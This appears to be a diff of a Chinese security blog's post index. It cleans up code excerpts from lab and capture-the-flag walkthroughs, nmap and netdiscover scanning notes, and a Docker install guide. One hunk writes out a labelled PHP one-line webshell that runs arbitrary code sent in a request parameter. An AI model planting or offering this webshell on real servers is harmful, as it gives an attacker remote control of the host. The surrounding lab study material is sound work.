@@ -225,7 +225,12 @@ Burpsuite Pro
 Proxy SwitchyOmega
 
 
-12345#webshell代码&lt;?php    @eval($_REQUEST[&quot;shell&quot;]);?&gt;
+#webshell代码
+
+&lt;?php
+    @eval($_REQUEST[&quot;shell&quot;]);
+?&gt;
+
 
 
 
@@ -355,12 +360,13 @@ nmap 描述​        Nmap (“Network Mapper(网络映射器)”) 是一款开�
 0x01 信息收集
 寻找靶机IP
 可以使用netdiscover或者 nmap进行IP扫描
-12netdiscover 10.112.132.0/24nmap 10.112.132.0/24
+netdiscover 10.112.132.0/24
+nmap 10.112.132.0/24
 
 
 扫描服务
 因为是使用了nmap进行了扫描IP , 所以顺便把服务也一起扫描了
-1nmap -A -
+nmap -A -T4
         </a>
       </p>
 
@@ -426,12 +432,12 @@ nmap 描述​        Nmap (“Network Mapper(网络映射器)”) 是一款开�
 0x01 信息收集
 寻找靶机IP
 由于Kali与靶机在统一网段 , 所以直接扫Kali IP所在的网段 , 使用netdiscover进行扫描
-1netdiscover 10.112.132.0/24
+netdiscover 10.112.132.0/24
 
 
 
 扫描靶机服务
-得知靶机的IP后 , 使用nmap进行服务扫描 , nmap
+得知靶机的IP后 , 使用nmap进行服务扫描 , nmap学
         </a>
       </p>
 
@@ -569,7 +575,8 @@ nmap 描述​        Nmap (“Network Mapper(网络映射器)”) 是一款开�
 
 
 
-0x00 先热个身吧12345&lt;?phpini_set(&quot;display_errors&quot
+0x00 先热个身吧&lt;?php
+ini_set(&quot;display_errors&quot;, 0
         </a>
       </p>
 
@@ -638,7 +645,8 @@ nmap 描述​        Nmap (“Network Mapper(网络映射器)”) 是一款开�
 
 
 
-0x001234567服务器端代码:function render (input) 
+0x00服务器端代码:
+function render (input) &#123;
         </a>
       </p>
 
@@ -705,7 +713,9 @@ Docker官方手册 :https://docs.docker.com/
 此文章演示的版本为Linux版本,系统为CentOS 7,官方手册明确说明:
 ​    若要在CentOS上安装Docker,则需要一个CentOS 7的维护版本。不支持或未测试存档版本。
 
-123456789101112131415161718#系统版本信息[root@localhos
+#系统版本信息
+[root@localhost ~]# cat /etc/os-release
+
         </a>
       </p>
 
